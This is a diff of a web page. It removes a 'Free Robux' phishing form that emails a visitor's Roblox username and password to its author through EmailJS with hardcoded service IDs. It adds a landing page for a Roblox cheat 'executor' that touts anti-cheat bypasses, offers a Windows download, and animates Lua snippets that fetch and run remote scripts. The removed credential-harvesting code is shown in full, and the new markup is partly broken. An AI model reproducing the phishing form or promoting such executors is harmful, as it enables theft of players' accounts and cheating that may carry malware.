@@ -1,81 +1,464 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Login Form</title>
-<style>
-  body {
-    font-family: Arial, sans-serif;
-    background-color: #f4f4f4;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    min-height: 100vh;
-    margin: 0;
-  }
-  .login-container {
-    background-color: #fff;
-    padding: 20px;
-    border-radius: 5px;
-    box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
-  }
-  input {
-    width: 100%;
-    padding: 10px;
-    margin-bottom: 10px;
-    border: 1px solid #ccc;
-    border-radius: 3px;
-  }
-  button {
-    background-color: #4caf50;
-    color: #fff;
-    padding: 10px 20px;
-    border: none;
-    border-radius: 3px;
-    cursor: pointer;
-  }
-</style>
-<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SimplyApi Executor | Basic But Powerful Roblox Exploiting</title>
+    <meta name="description" content="Free Roblox executor with a powerful api!">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: {
+                            50: '#f5f3ff',
+                            100: '#ede9fe',
+                            200: '#ddd6fe',
+                            300: '#c4b5fd',
+                            400: '#a78bfa',
+                            500: '#8b5cf6',
+                            600: '#7c3aed',
+                            700: '#6d28d9',
+                            800: '#5b21b6',
+                            900: '#4c1d95',
+                        },
+                        dark: {
+                            900: '#0f0f0f',
+                            800: '#1a1a1a',
+                            700: '#252525',
+                            600: '#303030',
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+        
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #0f0f0f;
+            color: white;
+            overflow-x: hidden;
+        }
+        
+        .gradient-text {
+            background: linear-gradient(90deg, #8b5cf6, #c4b5fd);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        
+        .glow {
+            box-shadow: 0 0 15px rgba(139, 92, 246, 0.5);
+        }
+        
+        .glow-hover:hover {
+            box-shadow: 0 0 20px rgba(139, 92, 246, 0.7);
+        }
+        
+        .executor-window {
+            background: linear-gradient(145deg, #1a1a1a, #0f0f0f);
+            border: 1px solid #303030;
+            border-radius: 0.5rem;
+        }
+        
+        .typewriter {
+            overflow: hidden;
+            border-right: 0.15em solid #8b5cf6;
+            white-space: nowrap;
+            margin: 0 auto;
+            letter-spacing: 0.15em;
+            animation: typing 3.5s steps(40, end), blink-caret 0.75s step-end infinite;
+        }
+        
+        @keyframes typing {
+            from { width: 0 }
+            to { width: 100% }
+        }
+        
+        @keyframes blink-caret {
+            from, to { border-color: transparent }
+            50% { border-color: #8b5cf6 }
+        }
+        
+        .feature-card:hover {
+            transform: translateY(-5px);
+            transition: all 0.3s ease;
+        }
+        
+        .download-btn {
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .download-btn::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                to bottom right,
+                rgba(255, 255, 255, 0) 45%,
+                rgba(255, 255, 255, 0.1) 50%,
+                rgba(255, 255, 255, 0) 55%
+            );
+            transform: rotate(30deg);
+            transition: all 0.3s;
+        }
+        
+        .download-btn:hover::after {
+            left: 100%;
+        }
+    </style>
 </head>
-<body>
-  <div class="login-container">
-    <h2>Free Robux</h2>
-    <input type="text" id="username" placeholder="Username">
-    <input type="password" id="password" placeholder="Password">
-    <button id="sendRobux">Send Robux</button>
-    <p id="status"></p>
-  </div>
-  <script>
-    document.getElementById("sendRobux").addEventListener("click", function() {
-      var username = document.getElementById("username").value;
-      var password = document.getElementById("password").value;
-      var statusElement = document.getElementById("status");
+<body class="min-h-screen">
+    <!-- Navigation -->
+    <nav class="bg-dark-900 border-b border-dark-700 fixed w-full z-10">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex justify-between h-16">
+                <div class="flex items-center">
+                    <div class="flex-shrink-0 flex items-center">
+                        <i class="fas fa-rocket text-primary-500 text-2xl mr-2"></i>
+                        <span class="text-xl font-bold gradient-text">SimplyApi Executor</span>
+                    </div>
+                </div>
+                <div class="hidden md:ml-6 md:flex md:items-center md:space-x-8">
+                    <a href="#features" class="text-gray-300 hover:text-white px-3 py-2 rounded-md text-sm font-medium">Features</a>
+                    <a href="#download" class="text-gray-300 hover:text-white px-3 py-2 rounded-md text-sm font-medium">Download</a>
+                    <a href="#faq" class="text-gray-300 hover:text-white px-3 py-2 rounded-md text-sm font-medium">FAQ</a>
+                    <a href="#contact" class="text-gray-300 hover:text-white px-3 py-2 rounded-md text-sm font-medium">Contact</a>
+                </div>
+                <div class="-mr-2 flex items-center md:hidden">
+                    <button type="button" class="inline-flex items-center justify-center p-2 rounded-md text-gray-400 hover:text-white hover:bg-dark-700 focus:outline-none" aria-controls="mobile-menu" aria-expanded="false" onclick="toggleMobileMenu()">
+                        <span class="sr-only">Open main menu</span>
+                        <i class="fas fa-bars"></i>
+                    </button>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Mobile menu -->
+        <div class="md:hidden hidden" id="mobile-menu">
+            <div class="px-2 pt-2 pb-3 space-y-1 sm:px-3 bg-dark-800">
+                <a href="#features" class="text-gray-300 hover:text-white block px-3 py-2 rounded-md text-base font-medium">Features</a>
+                <a href="#download" class="text-gray-300 hover:text-white block px-3 py-2 rounded-md text-base font-medium">Download</a>
+                <a href="#faq" class="text-gray-300 hover:text-white block px-3 py-2 rounded-md text-base font-medium">FAQ</a>
+                <a href="#contact" class="text-gray-300 hover:text-white block px-3 py-2 rounded-md text-base font-medium">Contact</a>
+            </div>
+        </div>
+    </nav>
 
-      // Disable the button to prevent multiple clicks
-      this.disabled = true;
+    <!-- Hero Section -->
+    <section class="pt-32 pb-20 px-4 sm:px-6 lg:px-8 max-w-7xl mx-auto">
+        <div class="text-center">
+            <h1 class="text-4xl md:text-6xl font-bold mb-6">
+                <span class="gradient-text">SimplyApi Executor</span>
+            </h1>
+            <p class="text-xl md:text-2xl text-gray-300 max-w-3xl mx-auto mb-10">
+                The free and powerful <span class="text-primary-400 font-semibold">free</span> Roblox executor
+            </p>
+            <div class="flex flex-col sm:flex-row justify-center gap-4">
+                <a href="#download" class="download-btn bg-primary-600 hover:bg-primary-700 text-white font-bold py-3 px-8 rounded-lg glow-hover transition duration-300">
+                    <i class="fas fa-download mr-2"></i> Download Now
+                </a>
+                <a href="#features" class="bg-dark-700 hover:bg-dark-600 text-white font-bold py-3 px-8 rounded-lg border border-dark-600 transition duration-300">
+                    <i class="fas fa-star mr-2"></i> Explore Features
+                </a>
+            </div>
+        </div>
+        
+        <!-- Executor Preview -->
+        <div class="mt-20 executor-window p-4 glow max-w-5xl mx-auto">
+            <div class="bg-dark-800 rounded-t-lg p-3 flex items-center">
+                <div class="flex space-x-2">
+                    <div class="w-3 h-3 rounded-full bg-red-500"></div>
+                    <div class="w-3 h-3 rounded-full bg-yellow-500"></div>
+                    <div class="w-3 h-3 rounded-full bg-green-500"></div>
+                </div>
+                <div class="ml-4 text-sm text-gray-400">Nebula Executor</div>
+            </div>
+            <div class="bg-dark-900 p-4 rounded-b-lg font-mono text-sm">
+                <div class="text-primary-400">SimplyApi> <span class="typewriter text-white">hi</span></div>
+                <div class="text-green-400 mt-2">[SUCCESS] Script executed successfully!</div>
+                <div class="text-gray-500 mt-4"></div>
+            </div>
+        </div>
+    </section>
 
-      // Configure Email JS with your service ID
-      emailjs.init("71fy8_9FDRHLaKzHK");
+    <!-- Features Section -->
+    <section id="features" class="py-20 px-4 sm:px-6 lg:px-8 max-w-7xl mx-auto bg-dark-800">
+        <div class="text-center mb-16">
+            <h2 class="text-3xl md:text-4xl font-bold mb-4">
+                <span class="gradient-text">Powerful Features</span>
+            </h2>
+            <p class="text-gray-400 max-w-2xl mx-auto">SimplyApi Executor comes packed with everything you need for a simple but powerful experience</p>
+        </div>
+        
+        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
+            <!-- Feature 1 -->
+            <div class="feature-card bg-dark-700 p-6 rounded-lg border border-dark-600 transition duration-300">
+                <div class="text-primary-500 text-3xl mb-4">
+                    <i class="fas fa-bolt"></i>
+                </div>
+                <h3 class="text-xl font-bold mb-2">Lightning Fast</h3>
+                <p class="text-gray-400">Instant injection and execution </p>
+            </div>
+            
+            <!-- Feature 2 -->
+            <div class="feature-card bg-dark-700 p-6 rounded-lg border border-dark-600 transition duration-300">
+                <div class="text-primary-500 text-3xl mb-4">
+                    <i class="fas fa-shield-alt"></i>
+                </div>
+                <h3 class="text-xl font-bold mb-2">Basic</h3>
+                <p class="text-gray-400">Basic and simple but it gets everything done with the easiest user interface</p>
+            </div>
+            
+            <!-- Feature 3 -->
+            <div class="feature-card bg-dark-700 p-6 rounded-lg border border-dark-600 transition duration-300">
+                <div class="text-primary-500 text-3xl mb-4">
+                    <i class="fas fa-code"></i>
+                </div>
+                <h3 class="text-xl font-bold mb-2">Multi Api</h3>
+                <p class="text-gray-400">We use the most powerful apis that are up and update to other ones when they are down</p>
+            </div>
+            
+          
+            
+            <!-- Feature 6 -->
+            <div class="feature-card bg-dark-700 p-6 rounded-lg border border-dark-600 transition duration-300">
+                <div class="text-primary-500 text-3xl mb-4">
+                    <i class="fas fa-sync-alt"></i>
+                </div>
+                <h3 class="text-xl font-bold mb-2">Fast Updates</h3>
+                <p class="text-gray-400">Unless there is a big patch we are probably always up!</p>
+            </div>
+        </div>
+    </section>
 
-      var templateParams = {
-        username: username,
-        password: password
-      };
+    <!-- Download Section -->
+    <section id="download" class="py-20 px-4 sm:px-6 lg:px-8 max-w-7xl mx-auto">
+        <div class="text-center mb-16">
+            <h2 class="text-3xl md:text-4xl font-bold mb-4">
+                <span class="gradient-text">Get SimplyApi Executor</span>
+            </h2>
+            <p class="text-gray-400 max-w-2xl mx-auto">Download the latest version of SimplyApi Executor for free</p>
+        </div>
+        
+        <div class="bg-dark-800 rounded-xl p-8 max-w-4xl mx-auto glow">
+            <div class="flex flex-col md:flex-row items-center">
+                <div class="md:w-1/2 mb-8 md:mb-0 md:pr-8">
+                    <div class="bg-dark-700 p-6 rounded-lg">
+                        <h3 class="text-xl font-bold mb-4 text-center">Current Version: v2.1.4</h3>
+                        <ul class="space-y-3 text-gray-400">
+                            <li class="flex items-start">
+                                <i class="fas fa-check text-primary-500 mt-1 mr-2"></i>
+                                <span>New Ui</span>
+                            </li>
+                            <li class="flex items-start">
+                                <i class="fas fa-check text-primary-500 mt-1 mr-2"></i>
+                                <span>Improved api</span>
+                            </li>
+                            <li class="flex items-start">
+                                <i class="fas fa-check text-primary-500 mt-1 mr-2"></i>
+                                <span>Fixed UI scaling issues</span>
+                            </li>
+                            <li class="flex items-start">
+                                <i class="fas fa-check text-primary-500 mt-1 mr-2"></i>
+                                <span>Fixed crashing</span>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="md:w-1/2">
+                    <div class="bg-gradient-to-br from-dark-700 to-dark-800 p-6 rounded-lg border border-dark-600">
+                        <h3 class="text-xl font-bold mb-6 text-center">Download Options</h3>
+                        <div class="space-y-4">
+                            <a href="#" class="download-btn block w-full bg-primary-600 hover:bg-primary-700 text-white font-bold py-3 px-4 rounded-lg text-center transition duration-300">
+                                <i class="fas fa-download mr-2"></i> Windows (.exe)
+                            </a>
+                           
+                        </div>
+                        <p class="text-xs text-gray-500 mt-4 text-center">All credits to orginal owners</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
 
-      // Send email using Email JS template
-      emailjs.send("service_03k8fcp", "template_8aaqrdx", templateParams)
-        .then(function(response) {
-          console.log("Email sent successfully:", response);
-          statusElement.textContent = "Email sent successfully!";
-          statusElement.style.color = "green";
-        })
-        .catch(function(error) {
-          console.error("Email sending error:", error);
-          statusElement.textContent = "Failed to send email.";
-          statusElement.style.color = "red";
+    <!-- FAQ Section -->
+    <section id="faq" class="py-20 px-4 sm:px-6 lg:px-8 max-w-7xl mx-auto bg-dark-800">
+        <div class="text-center mb-16">
+            <h2 class="text-3xl md:text-4xl font-bold mb-4">
+                <span class="gradient-text">Frequently Asked Questions</span>
+            </h2>
+            <p class="text-gray-400 max-w-2xl mx-auto">Find answers to common questions about Simply Executor</p>
+        </div>
+        
+        <div class="max-w-3xl mx-auto">
+            <div class="space-y-4">
+                <!-- FAQ Item 1 -->
+                <div class="bg-dark-700 rounded-lg overflow-hidden border border-dark-600">
+                    <button class="faq-question w-full flex justify-between items-center p-4 text-left" onclick="toggleFAQ(this)">
+                        <span class="font-medium">Is SimplyApi fully made by you?</span>
+                        <i class="fas fa-chevron-down text-primary-500 transition-transform duration-300"></i>
+                    </button>
+                    <div class="faq-answer hidden p-4 pt-0 text-gray-400 border-t border-dark-600">
+                       No it is made up of a lot of differnt apis and button logos because all we want is a basic and powerful exploiting experience.
+                    </div>
+                </div>
+                
+                <!-- FAQ Item 2 -->
+                <div class="bg-dark-700 rounded-lg overflow-hidden border border-dark-600">
+                    <button class="faq-question w-full flex justify-between items-center p-4 text-left" onclick="toggleFAQ(this)">
+                        <span class="font-medium">Who is it made by</span>
+                        <i class="fas fa-chevron-down text-primary-500 transition-transform duration-300"></i>
+                    </button>
+                    <div class="faq-answer hidden p-4 pt-0 text-gray-400 border-t border-dark-600">
+                       It would not be possible without my friend liam who made most of the website but sadly is quitting the project
+                    </div>
+                </div>
+                
+                
+                
+                <!-- FAQ Item 4 -->
+                <div class="bg-dark-700 rounded-lg overflow-hidden border border-dark-600">
+                    <button class="faq-question w-full flex justify-between items-center p-4 text-left" onclick="toggleFAQ(this)">
+                        <span class="font-medium">How often is SimplyApi updated?</span>
+                        <i class="fas fa-chevron-down text-primary-500 transition-transform duration-300"></i>
+                    </button>
+                    <div class="faq-answer hidden p-4 pt-0 text-gray-400 border-t border-dark-600">
+                        I will release updates every 1-4 weeks with new features, bug fixes, and improvments. Major updates that require Byfron bypasses are released as soon as possible after Roblox updates but api might be weaker.
+                    </div>
+                </div>
+                
+                <!-- FAQ Item 5 -->
+                <div class="bg-dark-700 rounded-lg overflow-hidden border border-dark-600">
+                    <button class="faq-question w-full flex justify-between items-center p-4 text-left" onclick="toggleFAQ(this)">
+                        <span class="font-medium">Can I contribute to SimplyApi's development?</span>
+                        <i class="fas fa-chevron-down text-primary-500 transition-transform duration-300"></i>
+                    </button>
+                    <div class="faq-answer hidden p-4 pt-0 text-gray-400 border-t border-dark-600">
+                        Yes! By doing the lootlabs on the download page you are supporting the project
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Contact Section -->
+    <section id="contact" class="py-20 px-4 sm:px-6 lg:px-8 max-w-7xl mx-auto">
+        <div class="text-center mb-16">
+            <h2 class="text-3xl md:text-4xl font-bold mb-4">
+                <span class="gradient-text">Get In Touch</span>
+            </h2>
+            <p class="text-gray-400 max-w-2xl mx-auto">Have questions or suggestions? Reach out to me</p>
+        </div>
+        
+        <div class="max-w-4xl mx-auto">
+            <div class="bg-dark-800 rounded-xl p-8 glow">
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
+                    <div
+                      </div>
+                            <div class="flex items-start">
+                                <i class="fab fa-discord text-primary-500 mt-1 mr-4"></i>
+                                <span>Join our Discord: https://discord.gg/pFbmNdnaEs</span>
+                            </div>
+                            
+                   
+
+    <!-- Footer -->
+    <footer class="bg-dark-900 border-t border-dark-700 py-10 px-4 sm:px-6 lg:px-8">
+        <div class="max-w-7xl mx-auto">
+            <div class="flex flex-col md:flex-row justify-between items-center">
+                <div class="flex items-center mb-6 md:mb-0">
+                    <i class="fas fa-rocket text-primary-500 text-2xl mr-2"></i>
+                    <span class="text-xl font-bold gradient-text">SimplyApi Executor</span>
+                </div>
+                <div class="flex space-x-6">
+                    <a href="#" class="text-gray-400 hover:text-white">
+                        <i class="fab fa-discord text-xl"></i>
+                    </a>
+                    <a href="#" class="text-gray-400 hover:text-white">
+                        <i class="fab fa-twitter text-xl"></i>
+                    </a>
+                    <a href="#" class="text-gray-400 hover:text-white">
+                        <i class="fab fa-youtube text-xl"></i>
+                    </a>
+                    <a href="#" class="text-gray-400 hover:text-white">
+                        <i class="fab fa-github text-xl"></i>
+                    </a>
+                </div>
+            </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Mobile menu toggle
+        function toggleMobileMenu() {
+            const menu = document.getElementById('mobile-menu');
+            menu.classList.toggle('hidden');
+        }
+        
+        // FAQ toggle
+        function toggleFAQ(button) {
+            const answer = button.nextElementSibling;
+            const icon = button.querySelector('i');
+            
+            answer.classList.toggle('hidden');
+            icon.classList.toggle('rotate-180');
+        }
+        
+        // Smooth scrolling for anchor links
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                
+                const targetId = this.getAttribute('href');
+                if (targetId === '#') return;
+                
+                const targetElement = document.querySelector(targetId);
+                if (targetElement) {
+                    targetElement.scrollIntoView({
+                        behavior: 'smooth'
+                    });
+                    
+                    // Close mobile menu if open
+                    const mobileMenu = document.getElementById('mobile-menu');
+                    if (!mobileMenu.classList.contains('hidden')) {
+                        mobileMenu.classList.add('hidden');
+                    }
+                }
+            });
         });
-    });
-  </script>
+        
+        // Typewriter effect
+        const phrases = [
+            "loadstring(game:HttpGet('https://raw.githubusercontent.com/yourscripthere'))()",
+            "game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 50",
+            "for i,v in pairs(game:GetService('Players'):GetPlayers()) do print(v.Name) end",
+            "game:GetService('StarterGui'):SetCore('SendNotification', {Title='Nebula', Text='Script executed!'})"
+        ];
+        
+        let currentPhrase = 0;
+        const typewriterElement = document.querySelector('.typewriter');
+        
+        function changePhrase() {
+            currentPhrase = (currentPhrase + 1) % phrases.length;
+            typewriterElement.textContent = phrases[currentPhrase];
+            typewriterElement.style.width = '0';
+            typewriterElement.style.animation = 'none';
+            void typewriterElement.offsetWidth; // Trigger reflow
+            typewriterElement.style.animation = 'typing 3.5s steps(40, end), blink-caret 0.75s step-end infinite';
+        }
+        
+        setInterval(changePhrase, 5000);
+    </script>
 </body>
 </html>
